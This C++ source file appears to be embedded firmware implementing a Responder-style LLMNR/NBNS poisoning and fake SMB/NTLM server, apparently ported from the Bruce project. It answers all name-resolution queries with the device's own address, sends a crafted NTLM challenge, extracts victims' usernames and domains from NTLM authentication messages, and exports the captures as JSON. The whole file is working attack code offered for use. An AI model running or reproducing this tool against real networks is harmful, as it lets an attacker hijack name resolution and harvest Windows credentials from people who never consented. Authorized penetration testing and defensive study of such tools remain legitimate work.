// ============================================================
//  responder.cpp  -  LLMNR/NBNS/SMB Responder (ported from Bruce)
// ============================================================
#include "responder.h"
#include "scoped_lock.h"
#include <new>
#include <cstring>
#include <sys/time.h>

Responder responder;

// ── SMB constants ─────────────────────────────────────────────
#define SMB_FLAGS_REPLY          0x80
#define SMB_FLAGS2_UNICODE       0x8000
#define SMB_FLAGS2_ERR_STATUS32  0x4000
#define SMB_FLAGS2_EXTSEC        0x0800
#define SMB_CAP_EXTSEC           0x80000000UL
#define SMB_CAP_LARGE_FILES      0x00000008UL
#define SMB_CAP_NT_SMBS          0x00000010UL
#define SMB_CAP_UNICODE          0x00000004UL
#define SMB_CAP_STATUS32         0x00000040UL
#define SMB_CAPABILITIES         (SMB_CAP_EXTSEC|SMB_CAP_LARGE_FILES|SMB_CAP_NT_SMBS|SMB_CAP_UNICODE|SMB_CAP_STATUS32)

#define NBNS_PORT   137
#define LLMNR_PORT  5355
#define SMB_PORT    445

// ─────────────────────────────────────────────────────────────
void Responder::begin() {
    if (!_capMux) _capMux = xSemaphoreCreateRecursiveMutex();
    Serial.println("[RESP] Ready");
}

void Responder::start(const String& hostname, const String& domain, const String& dns) {
    _hostname = hostname;
    _domain   = domain;
    _dns      = dns;
    _startMs  = millis();
    _active   = true;

    _nbnsUdp.begin(NBNS_PORT);
    _llmnrUdp.begin(LLMNR_PORT);

    if (_smbServer) { delete _smbServer; _smbServer = nullptr; }
    _smbServer = new WiFiServer(SMB_PORT);
    _smbServer->begin();

    Serial.printf("[RESP] Started host=%s domain=%s\n",
                  hostname.c_str(), domain.c_str());
}

void Responder::stop() {
    _active = false;
    _nbnsUdp.stop();
    _llmnrUdp.stop();
    if (_smbServer) { _smbServer->stop(); delete _smbServer; _smbServer = nullptr; }
    Serial.printf("[RESP] Stopped captures=%u\n", (unsigned)_captures.size());
}

void Responder::loop() {
    if (!_active) return;
    _handleNbns();
    _handleLlmnr();
    _handleSmb();
}

// ── Helpers ────────────────────────────────────────────────────
IPAddress Responder::_myIp() const {
    if (WiFi.status() == WL_CONNECTED) {
        IPAddress ip = WiFi.localIP();
        if (ip && ip != IPAddress(0,0,0,0)) return ip;
    }
    return WiFi.softAPIP();
}

void Responder::_encodeNetBiosName(const char* name, uint8_t out[32]) {
    char padded[16];
    memset(padded, ' ', 15);
    padded[15] = 0x20;
    size_t n = strlen(name);
    if (n > 15) n = 15;
    for (size_t i = 0; i < n; i++) padded[i] = toupper(name[i]);
    for (int i = 0; i < 16; i++) {
        uint8_t c = (uint8_t)padded[i];
        out[2*i]   = 0x41 + ((c >> 4) & 0x0F);
        out[2*i+1] = 0x41 + (c & 0x0F);
    }
}

void Responder::_addCapture(const String& proto, const String& user,
                             const String& domain, const String& query,
                             const String& clientIp, const String& hash) {
    ScopedLock lk(_capMux);
    // Deduplicate by user+proto
    for (auto& c : _captures)
        if (c.protocol == proto && c.username == user) { c.timestamp = millis(); return; }

    ResponderCapture cap;
    cap.protocol  = proto;
    cap.username  = user;
    cap.domain    = domain;
    cap.queryName = query;
    cap.clientIp  = clientIp;
    cap.ntlmHash  = hash;
    cap.timestamp = millis();
    _captures.push_back(cap);
    Serial.printf("[RESP] Captured %s user=%s@%s query=%s from=%s\n",
                  proto.c_str(), user.c_str(), domain.c_str(),
                  query.c_str(), clientIp.c_str());
}

// ── NBNS ──────────────────────────────────────────────────────
void Responder::_handleNbns() {
    int sz = _nbnsUdp.parsePacket();
    if (sz < 12) return;

    uint8_t buf[256] = {};
    _nbnsUdp.read(buf, min(sz, (int)sizeof(buf)));
    IPAddress remote = _nbnsUdp.remoteIP();
    uint16_t txId = (buf[0] << 8) | buf[1];
    uint16_t flags = (buf[2] << 8) | buf[3];
    if (flags & 0x8000) return; // already a response

    // Extract encoded name (34 bytes starting at offset 13)
    if (sz < 47) return;
    uint8_t encodedName[32];
    memcpy(encodedName, buf + 13, 32);

    // Decode to string for logging
    char decoded[17] = {};
    for (int i = 0; i < 15; i++) {
        uint8_t hi = encodedName[2*i]   - 0x41;
        uint8_t lo = encodedName[2*i+1] - 0x41;
        decoded[i] = (char)((hi << 4) | lo);
    }
    String qname = String(decoded);
    qname.trim();

    _addCapture("NBNS", "", "", qname, remote.toString());
    _sendNbnsResponse(remote, txId, encodedName);
}

void Responder::_sendNbnsResponse(const IPAddress& dst, uint16_t txId,
                                   const uint8_t* encodedName) {
    IPAddress myIp = _myIp();
    uint8_t resp[62] = {};
    resp[0] = txId >> 8; resp[1] = txId & 0xFF;
    resp[2] = 0x85; resp[3] = 0x00; // flags: response + authoritative
    resp[4] = 0x00; resp[5] = 0x00; // questions
    resp[6] = 0x00; resp[7] = 0x01; // answer RRs
    // Name
    resp[12] = 0x20; // length 32
    memcpy(resp + 13, encodedName, 32);
    resp[45] = 0x00; // end label
    // Type NB, Class IN
    resp[46] = 0x00; resp[47] = 0x20;
    resp[48] = 0x00; resp[49] = 0x01;
    // TTL 30s
    resp[50] = 0x00; resp[51] = 0x00; resp[52] = 0x00; resp[53] = 0x1e;
    // RDATA length 6
    resp[54] = 0x00; resp[55] = 0x06;
    // NB flags + IP
    resp[56] = 0x00; resp[57] = 0x00;
    resp[58] = myIp[0]; resp[59] = myIp[1];
    resp[60] = myIp[2]; resp[61] = myIp[3];

    _nbnsUdp.beginPacket(dst, NBNS_PORT);
    _nbnsUdp.write(resp, 62);
    _nbnsUdp.endPacket();
}

// ── LLMNR ─────────────────────────────────────────────────────
void Responder::_handleLlmnr() {
    int sz = _llmnrUdp.parsePacket();
    if (sz < 12) return;

    uint8_t buf[256] = {};
    _llmnrUdp.read(buf, min(sz, (int)sizeof(buf)));
    IPAddress remote = _llmnrUdp.remoteIP();
    uint16_t txId  = (buf[0] << 8) | buf[1];
    uint16_t flags = (buf[2] << 8) | buf[3];
    if (flags & 0x8000) return;

    // Parse question name (DNS format). Cap length and bound every buf[]
    // access: the packet is attacker-controlled and feeds a fixed response
    // buffer downstream.
    String qname = "";
    int pos = 12;
    while (pos < sz && buf[pos] != 0 && qname.length() < 200) {
        uint8_t len = buf[pos++];
        for (int i = 0; i < len && pos < sz; i++, pos++)
            qname += (char)buf[pos];
        if (pos < sz && buf[pos] != 0) qname += '.';
    }

    _addCapture("LLMNR", "", "", qname, remote.toString());
    _sendLlmnrResponse(remote, txId, qname);
}

void Responder::_sendLlmnrResponse(const IPAddress& dst, uint16_t txId,
                                    const String& name) {
    IPAddress myIp = _myIp();
    uint8_t resp[256] = {};
    resp[0] = txId >> 8; resp[1] = txId & 0xFF;
    resp[2] = 0x80; resp[3] = 0x00;
    resp[4] = 0x00; resp[5] = 0x01; // questions
    resp[6] = 0x00; resp[7] = 0x01; // answers

    // Copy question section. Bound every write: `name` originates from a
    // network packet, so without this a long query name overflows resp[].
    // Reserve 24 bytes for the trailing null + type/class + answer record.
    int pos = 12;
    const char* n = name.c_str();
    while (*n) {
        const char* dot = strchr(n, '.');
        uint8_t len = dot ? (uint8_t)(dot - n) : (uint8_t)strlen(n);
        if (pos + 1 + (int)len + 24 >= (int)sizeof(resp)) break;  // no room - stop safely
        resp[pos++] = len;
        memcpy(resp + pos, n, len); pos += len;
        n += len; if (*n == '.') n++;
    }
    resp[pos++] = 0x00;
    resp[pos++] = 0x00; resp[pos++] = 0x01; // type A
    resp[pos++] = 0x00; resp[pos++] = 0x01; // class IN

    // Answer: pointer to question + type A + TTL + IP
    resp[pos++] = 0xC0; resp[pos++] = 0x0C;
    resp[pos++] = 0x00; resp[pos++] = 0x01;
    resp[pos++] = 0x00; resp[pos++] = 0x01;
    resp[pos++] = 0x00; resp[pos++] = 0x00; resp[pos++] = 0x00; resp[pos++] = 0x1e;
    resp[pos++] = 0x00; resp[pos++] = 0x04;
    resp[pos++] = myIp[0]; resp[pos++] = myIp[1];
    resp[pos++] = myIp[2]; resp[pos++] = myIp[3];

    _llmnrUdp.beginPacket(dst, LLMNR_PORT);
    _llmnrUdp.write(resp, pos);
    _llmnrUdp.endPacket();
}

// ── SMB / NTLM ────────────────────────────────────────────────
void Responder::_buildNtlmType2(uint8_t* challenge, uint8_t* buf, uint16_t* len) {
    // Minimal NTLM Type2 challenge message
    memcpy(buf, "NTLMSSP\0", 8);
    buf[8] = 0x02; buf[9] = 0x00; buf[10] = 0x00; buf[11] = 0x00; // MsgType=2

    // Target name offset/len (empty)
    buf[12]=0x00; buf[13]=0x00; buf[14]=0x00; buf[15]=0x00; buf[16]=0x38; buf[17]=0x00;

    // Flags
    uint32_t flags = 0x00008201 | 0x00000200 | 0x00080000 | 0x02000000;
    memcpy(buf+20, &flags, 4);

    // Challenge (8 bytes)
    memcpy(buf+24, challenge, 8);

    // Context (8 bytes zero)
    memset(buf+32, 0, 8);

    // Target info offset
    buf[40]=0x00; buf[41]=0x00; buf[42]=0x00; buf[43]=0x00;
    buf[44]=0x38; buf[45]=0x00;

    *len = 56;
}

// _handleSmb: accept the TCP client and immediately hand it off to a
// short-lived task. Previously the blocking read loops (delay(10) ×300 +
// delay(10) ×200) stalled loop() for up to ~5 s — enough to trip the
// WDT loop-stall warning and starve IR/WS/scheduler.
void Responder::_handleSmb() {
    if (!_smbServer) return;
    WiFiClient client = _smbServer->accept();
    if (!client) return;

    // Heap-allocate the argument struct so the task owns it.
    struct SmbArgs { Responder* self; WiFiClient client; };
    auto* args = new (std::nothrow) SmbArgs{this, client};
    if (!args) { client.stop(); return; }

    if (xTaskCreate([](void* p) {
        auto* a = static_cast<SmbArgs*>(p);
        a->self->_smbConversation(a->client);
        delete a;
        vTaskDelete(NULL);
    }, "smb_conv", 4096, args, 1, nullptr) != pdPASS) {
        client.stop();
        delete args;
    }
    // loop() returns immediately; the task handles the rest.
}

// Full blocking SMB/NTLM conversation — runs in detached task, not loop().
void Responder::_smbConversation(WiFiClient client) {
    String clientIp = client.remoteIP().toString();
    uint32_t deadline = millis() + 3000;
    uint8_t buf[512] = {};
    int got = 0;

    while (client.connected() && millis() < deadline) {
        if (client.available()) {
            got = client.read(buf, sizeof(buf));
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(10));   // vTaskDelay — this is a task, not loop()
    }

    if (got < 8) { client.stop(); return; }

    if (buf[4] == 0xFF && buf[5] == 'S' && buf[6] == 'M' && buf[7] == 'B') {
        uint8_t challenge[8];
        for (int i = 0; i < 8; i++) challenge[i] = random(0, 256);

        uint8_t ntlm[512] = {};
        uint16_t ntlmLen = 0;
        _buildNtlmType2(challenge, ntlm, &ntlmLen);

        uint8_t resp[128] = {};
        resp[0] = 0x00;
        uint8_t smb[] = {0xFF,'S','M','B',0x72,0x00,0x00,0x00,0x00,
                         SMB_FLAGS_REPLY,0x00,0x00,0x00,0x00,0x00,0x00,
                         0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        memcpy(resp+4, smb, sizeof(smb));
        client.write(resp, 64);

        _addCapture("SMB", "", "", "", clientIp, "");
    }

    memset(buf, 0, sizeof(buf));
    deadline = millis() + 2000;
    while (client.connected() && millis() < deadline) {
        if (client.available()) {
            got = client.read(buf, sizeof(buf));
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    for (int i = 0; i < got - 8; i++) {
        if (memcmp(buf+i, "NTLMSSP\0", 8) == 0 && i+12 < got) {
            uint32_t msgType = buf[i+8] | (buf[i+9]<<8) | (buf[i+10]<<16) | (buf[i+11]<<24);
            if (msgType == 3) {
                String user = "", domain = "";
                uint16_t domLen = buf[i+28] | (buf[i+29]<<8);
                uint16_t domOff = buf[i+32] | (buf[i+33]<<8);
                if (domOff + domLen < (uint16_t)got) {
                    for (int j = 0; j < domLen && j < 32; j += 2)
                        if (buf[i+domOff+j]) domain += (char)buf[i+domOff+j];
                }
                uint16_t usrLen = buf[i+36] | (buf[i+37]<<8);
                uint16_t usrOff = buf[i+40] | (buf[i+41]<<8);
                if (usrOff + usrLen < (uint16_t)got) {
                    for (int j = 0; j < usrLen && j < 64; j += 2)
                        if (buf[i+usrOff+j]) user += (char)buf[i+usrOff+j];
                }
                _addCapture("NTLM", user, domain, "", clientIp, "captured");
            }
            break;
        }
    }
    client.stop();
}

// ── JSON output ───────────────────────────────────────────────
void Responder::clearCaptures() {
    ScopedLock lk(_capMux);
    _captures.clear();
}

String Responder::capturesJson() const {
    ScopedLock lk(_capMux);
    String r = "[";
    for (size_t i = 0; i < _captures.size(); i++) {
        if (i) r += ',';
        const auto& c = _captures[i];
        r += "{\"proto\":\"" + c.protocol + "\","
             "\"user\":\"" + c.username + "\","
             "\"domain\":\"" + c.domain + "\","
             "\"query\":\"" + c.queryName + "\","
             "\"client\":\"" + c.clientIp + "\","
             "\"hash\":\"" + c.ntlmHash + "\","
             "\"age\":" + String((millis()-c.timestamp)/1000) + "}";
    }
    r += "]";
    return r;
}

String Responder::statusJson() const {
    ScopedLock lk(_capMux);
    char buf[128];
    snprintf(buf, sizeof(buf),
        "{\"active\":%s,\"captures\":%u,\"host\":\"%s\",\"domain\":\"%s\"}",
        _active ? "true" : "false",
        (unsigned)_captures.size(),
        _hostname.c_str(), _domain.c_str());
    return String(buf);
}

